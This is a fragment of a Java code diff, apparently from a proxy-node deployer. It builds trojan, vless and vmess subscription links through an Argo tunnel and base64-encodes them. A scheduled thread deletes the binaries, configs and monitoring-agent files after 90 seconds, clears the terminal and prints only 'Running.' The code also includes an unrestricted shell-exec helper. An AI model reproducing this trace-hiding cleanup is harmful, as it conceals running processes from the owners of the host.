+        String trojan = "trojan://" + UUID + "@" + CFIP + ":" + CFPORT +
+            "?security=tls&sni=" + domain + "&fp=firefox&type=ws&host=" + domain +
+            "&path=%2Ftrojan-argo%3Fed%3D2560#" + nodeName;
+
+        String sub     = vless + "\n\n" + vmess + "\n\n" + trojan + "\n";
+        String encoded = b64(sub);
+        writeFile(pSub, encoded);
+        subContent = encoded;
+
+        System.out.println(sub);
+        System.out.println(encoded);
+    }
+
+    // ============ 清理敏感文件（90秒后）============
+    private static void scheduleCleanup() {
+        new Thread(() -> {
+            try { Thread.sleep(90000); } catch (InterruptedException ignored) {}
+            for (String f : new String[]{pBootLog, pConfig, pWeb, pBot, pTJson, pTYml, pTYaml})
+                new File(f).delete();
+            if (!NEZHA_PORT_S.isEmpty()) new File(pNpm).delete();
+            else if (!NEZHA_SERVER.isEmpty() && !NEZHA_KEY.isEmpty()) new File(pPhp).delete();
+            System.out.print("\033[H\033[2J");
+            System.out.flush();
+            System.out.println("Running.");
+        }).start();
+    }
+
+    // ============ 工具方法 ============
+    private static void sh(String cmd) throws Exception {
+        Runtime.getRuntime().exec(new String[]{"sh", "-c", cmd});
+    }
+
+    private static void writeFile(String path, String content) throws IOException {
+        try (OutputStreamWriter w = new OutputStreamWriter(new FileOutputStream(path), StandardCharsets.UTF_8)) {
+            w.write(content);
+        }
+    }
+
+    private static String readFile(String path) throws IOException {
+        return readStream(new FileInputStream(path));
+    }
+
+    private static String readStream(InputStream in) throws IOException {
+        StringBuilder sb = new StringBuilder();
+        try (BufferedReader r = new BufferedReader(new InputStreamReader(in, StandardCharsets.UTF_8))) {
+            String line;
+            while ((line = r.readLine()) != null) sb.append(line).append('\n');
+        }
+        return sb.toString();
+    }
+
+    private static String b64(String s) {
+        return Base64.getEncoder().encodeToString(s.getBytes(StandardCharsets.UTF_8));
+    }
+
+    private static String rnd(int len) {
+        String c = "abcdefghijklmnopqrstuvwxyz";
+        StringBuilder sb = new StringBuilder();
+        Random rng = new Random();
+        for (int i = 0; i < len; i++) sb.append(c.charAt(rng.nextInt(c.length())));
+        return sb.toString();
+    }
+
+    private static String ge(String key, String def) {
+        String v = System.getenv(key);
+        return (v != null && !v.trim().isEmpty()) ? v.trim() : def;
     }
 }
